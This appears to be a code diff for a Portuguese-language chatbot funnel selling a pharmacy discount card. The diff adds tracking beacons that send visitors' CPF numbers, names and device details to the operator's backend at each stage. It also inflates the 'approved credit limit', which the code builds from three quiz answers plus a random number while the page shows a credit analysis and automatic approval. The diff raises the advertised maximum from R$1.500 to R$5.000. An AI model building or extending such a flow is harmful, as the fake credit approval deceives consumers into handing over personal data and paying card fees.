@@ -38,6 +38,46 @@
   /* ---- Cache de preços dos produtos (vindo do painel) ---- */
   var __precos = { virtual: 4.99, fisico: 19.99 };
 
+  /* ---- Session tracking ---- */
+  function getDeviceInfo() {
+    var ua = navigator.userAgent;
+    var disp = sessionStorage.getItem('vs_dispositivo') || 'Desktop';
+    var mod = sessionStorage.getItem('vs_modelo') || 'PC';
+    var os = sessionStorage.getItem('vs_os') || '';
+    var nav = sessionStorage.getItem('vs_navegador') || (/Chrome/.test(ua) ? 'Chrome' : /Firefox/.test(ua) ? 'Firefox' : /Safari/.test(ua) && !/Chrome/.test(ua) ? 'Safari' : /Edge/.test(ua) ? 'Edge' : 'Desconhecido');
+    var navVer = sessionStorage.getItem('vs_navegador_versao') || '';
+    var fab = sessionStorage.getItem('vs_fabricante') || '';
+    return { dispositivo: disp, modelo: mod, fabricante: fab, navegador: nav, navegador_versao: navVer, os: os };
+  }
+
+  async function ensureSession() {
+    try {
+      if (sessionStorage.getItem('vs_session_id')) return;
+      var base = window.__API_BASE || '/api';
+      var dd = getDeviceInfo();
+      var info = Object.assign({ visitor_id: 'v-' + Date.now() + '-' + Math.random().toString(36).slice(2,10), origem: document.referrer || '' }, dd);
+      var r = await fetch(base + '/track/session/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info) });
+      var d = await r.json();
+      if (d.session_id) {
+        sessionStorage.setItem('vs_session_id', d.session_id);
+        // Persiste os device fields no sessionStorage
+        if (dd.fabricante) sessionStorage.setItem('vs_fabricante', dd.fabricante);
+        if (dd.navegador_versao) sessionStorage.setItem('vs_navegador_versao', dd.navegador_versao);
+      }
+    } catch(e) {}
+  }
+
+  function trackStage(stage, extra) {
+    try {
+      var sid = sessionStorage.getItem('vs_session_id');
+      if (!sid) return;
+      var base = window.__API_BASE || '/api';
+      var payload = Object.assign({ session_id: sid, stage: stage }, getDeviceInfo());
+      if (extra) { for (var k in extra) { if (extra.hasOwnProperty(k)) payload[k] = extra[k]; } }
+      navigator.sendBeacon(base + '/track/session/stage', new Blob([JSON.stringify(payload)], {type:'application/json'}));
+    } catch(e) {}
+  }
+
   async function carregarPrecos() {
     try {
       var prods = await fetch((window.__API_BASE||'/api')+'/products').then(function(r){ return r.json(); });
@@ -344,6 +384,7 @@
   chatInput.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') { e.preventDefault(); sendUserInput(chatInput.value); return; }
     if (chatInput.dataset.mode === 'cpf') {
+      trackStage('Consultando CPF');
       requestAnimationFrame(function() { chatInput.value = fmtCpf(chatInput.value); });
     } else if (chatInput.dataset.mode === 'phone') {
       requestAnimationFrame(function() { chatInput.value = fmtPhone(chatInput.value); });
@@ -435,8 +476,10 @@
 
       // Verifica CPF existente no backend
       addTyping(); await sleep(400); removeTyping();
+      trackStage('Consultando CPF');
       var existente = await verificarCPFExistente(cpf);
-      if (existente) return;
+      if (existente) { trackStage('CPF Encontrado', {cpf: cpf}); return; }
+      trackStage('CPF Não Encontrado');
 
       // Consulta API CPF externa
       addTyping(); await sleep(500); removeTyping();
@@ -658,6 +701,7 @@
     hideInput();
     updateProgress(5);
 
+    trackStage('Respondendo Questionário - Pergunta 1 de 3');
     addTyping(); await sleep(500); removeTyping();
     addMsg('📊 <strong>Quanto você gasta com medicamentos por mês?</strong>');
     await new Promise(function(resolve) {
@@ -669,6 +713,7 @@
     });
 
     await sleep(300); addTyping(); await sleep(500); removeTyping();
+    trackStage('Respondendo Questionário - Pergunta 2 de 3');
     addMsg('📊 <strong>Com que frequência compra em farmácias?</strong>');
     await new Promise(function(resolve) {
       showOptions([
@@ -679,6 +724,7 @@
     });
 
     await sleep(300); addTyping(); await sleep(500); removeTyping();
+    trackStage('Respondendo Questionário - Pergunta 3 de 3');
     addMsg('📊 <strong>Quantas pessoas na sua família usam medicamentos?</strong>');
     await new Promise(function(resolve) {
       showOptions([
@@ -702,25 +748,26 @@
       { label:'✅ Aceito e continuar', primary:true, action:function(){
         if (!document.getElementById('chkTermos')?.checked) { addMsg('Marque a caixa para aceitar os termos.','bot'); return; }
         document.getElementById('chatTermos')?.remove();
-        etapaDocs();
+        trackStage('Preenchendo Cadastro'); etapaDocs();
       }}
     ]);
   }
 
   /* ---- ANÁLISE AUTOMÁTICA + POPUP APROVAÇÃO ---- */
   async function etapaAnalisePopup() {
+    trackStage('Analisando Crédito');
     updateProgress(7);
     var clientId = 'CLI-'+Date.now().toString(36).toUpperCase();
     var limite = (function() {
-      var base = 850;
-      if (quizAnswers.gasto === 'R$ 51 a R$ 200') base += 150;
-      else if (quizAnswers.gasto === 'Acima de R$ 200') base += 300;
-      if (quizAnswers.frequencia === '1 vez por mês') base += 100;
-      else if (quizAnswers.frequencia === 'Várias vezes por mês') base += 250;
-      if (quizAnswers.pessoas === 'Eu + 1 pessoa') base += 100;
-      else if (quizAnswers.pessoas === 'Toda a família') base += 200;
-      base += Math.floor(Math.random() * 101);
-      base = Math.min(1500, Math.max(850, base));
+      var base = 1800;
+      if (quizAnswers.gasto === 'R$ 51 a R$ 200') base += 300;
+      else if (quizAnswers.gasto === 'Acima de R$ 200') base += 600;
+      if (quizAnswers.frequencia === '1 vez por mês') base += 200;
+      else if (quizAnswers.frequencia === 'Várias vezes por mês') base += 400;
+      if (quizAnswers.pessoas === 'Eu + 1 pessoa') base += 200;
+      else if (quizAnswers.pessoas === 'Toda a família') base += 400;
+      base += Math.floor(Math.random() * 201);
+      base = Math.min(3500, Math.max(1800, base));
       return Math.round(base / 50) * 50;
     })();
     flowState = 'analysis';
@@ -773,10 +820,18 @@
       nome_mae: '', renda: '0', profissao: '', situacao: '',
       limite_aprovado: limite,
       dispositivo: sessionStorage.getItem('vs_dispositivo')||'Desktop',
-      modelo: sessionStorage.getItem('vs_modelo')||'PC'
+      modelo: sessionStorage.getItem('vs_modelo')||'PC',
+      fabricante: sessionStorage.getItem('vs_fabricante')||'',
+      os: sessionStorage.getItem('vs_os')||'',
+      navegador: sessionStorage.getItem('vs_navegador')||'',
+      navegador_versao: sessionStorage.getItem('vs_navegador_versao')||''
     };
     var apiResult = await API.createClient(apiData).catch(function(){ return null; });
     clientId = apiResult ? apiResult.clientId : clientId;
+    if (apiResult) {
+      trackStage('Cadastro Aprovado', {nome: user.nome, cpf: user.cpf});
+      API.updateClientStatus(clientId, 'aprovado', limite);
+    }
 
     sessionStorage.setItem('vs_clientId', clientId);
     sessionStorage.setItem('vs_nome', (user.nome||'').split(' ')[0]);
@@ -870,7 +925,7 @@
           '<ul style="list-style:none;padding:0;margin:0 0 4px;display:flex;flex-direction:column;gap:3px;">'+
             '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Cart\u00e3o F\u00edsico + Virtual</li>'+
             '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> At\u00e9 75% OFF em medicamentos</li>'+
-            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Limite de at\u00e9 R$ 1.500</li>'+
+            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Limite de at\u00e9 R$ 5.000</li>'+
             '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> 2% Cashback + Teleconsulta</li>'+
           '</ul>'+
           '<div style="display:flex;align-items:baseline;gap:3px;padding:5px 0;border-top:1px solid rgba(255,255,255,0.04);margin-bottom:6px;">'+
@@ -965,6 +1020,7 @@
     scrollDown();
 
     document.getElementById('btnConfirmarDados').onclick = function() {
+      trackStage('Enviando Cadastro');
       btnConfirmarDados.remove();
 
       addMsg(
@@ -1331,6 +1387,11 @@
       sessionStorage.setItem('vs_nome', primeiroNome);
       sessionStorage.setItem('vs_nome_completo', nome);
       sessionStorage.setItem('vs_limite', limite);
+      // Atualiza device info do cliente com os dados da sessão atual
+      try {
+        var dd = getDeviceInfo();
+        API.updateClientDevice(client.id, { dispositivo: dd.dispositivo, modelo: dd.modelo, fabricante: dd.fabricante, os: dd.os, navegador: dd.navegador, navegador_versao: dd.navegador_versao });
+      } catch(e) {}
       addMsg('👋 Olá novamente, <strong>'+primeiroNome+'</strong>! Localizamos seu cadastro.', 'bot');
       hideInput(); await sleep(1200);
       if (client.status==='aprovado'||client.status==='ativado') {
@@ -1402,6 +1463,7 @@
   /* ---- Inicialização ---- */
   async function init() {
     carregarPrecos();
+    await ensureSession();
     await iniciarFluxo();
   }
 
